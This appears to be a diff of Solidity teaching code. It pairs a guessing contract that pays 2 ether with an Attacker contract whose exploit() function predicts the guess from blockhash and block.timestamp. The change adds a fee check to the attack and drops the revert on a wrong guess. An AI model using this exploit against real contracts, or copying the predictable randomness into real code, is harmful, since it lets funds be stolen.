@@ -19,8 +19,6 @@ contract Example4 {
         if (result == n) {
             (bool success, ) = payable(msg.sender).call{value: 2 ether}("");
             require(success, "Low level call failed");
-        } else {
-            revert("Failed guess!");
         }
     }
 }
@@ -34,7 +32,8 @@ contract Attacker {
         victim = Example4(target);
     }
 
-    function exploit() external {      
+    function exploit() external payable {      
+        require(msg.value == FEE, "Fee not paid!");
         result = uint256(
             keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
         );
